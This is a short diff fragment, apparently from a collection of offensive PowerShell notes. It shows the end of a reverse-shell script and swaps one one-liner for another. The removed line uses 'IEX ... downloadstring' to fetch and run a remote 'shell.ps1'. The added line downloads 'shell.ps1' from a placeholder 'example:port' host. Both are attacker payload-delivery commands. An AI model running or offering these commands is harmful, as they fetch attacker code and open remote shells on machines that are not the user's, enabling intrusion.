@@ -98,7 +98,6 @@ ength);​ $stream​ .Flush()};​ $client​ .Close()
 ```
 
 ```
-START /B ​ ""​ powershell -c IEX (​ New-Object
-Net.Webclient).downloadstring(​ 'http[:]//example/shell.ps1'​ )
+START /B "" powershell "(new-object System.Net.WebClient).Downloadfile('http://example:port/shell.ps1', 'shell.ps1')"
 ```
 
